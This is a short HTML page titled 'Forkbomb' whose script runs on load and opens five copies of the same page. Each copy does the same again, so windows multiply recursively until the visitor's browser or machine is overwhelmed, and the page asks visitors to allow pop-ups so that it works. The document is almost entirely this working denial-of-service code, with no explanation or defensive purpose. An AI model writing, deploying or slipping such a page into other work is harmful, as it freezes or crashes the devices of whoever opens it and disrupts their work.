<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forkbomb</title>
    <script>
        function openMultipleWindows() {
            setTimeout(() => {
                for (let i = 0; i < 5; i++) {
                    let newWindow = window.open(window.location.href, '_blank', 'width=600,height=400,left=' + (i * 50) + ',top=' + (i * 50));
                    if (newWindow) {
                        newWindow.onload = openMultipleWindows;
                    }
                }
            }, 100);
        }
        window.onload = openMultipleWindows;
    </script>
</head>
<body>
    <h1>Opening Recursive Copies of This Page</h1>
    <p>If pop-ups are blocked, allow them to enable this functionality.</p>
</body>
</html>
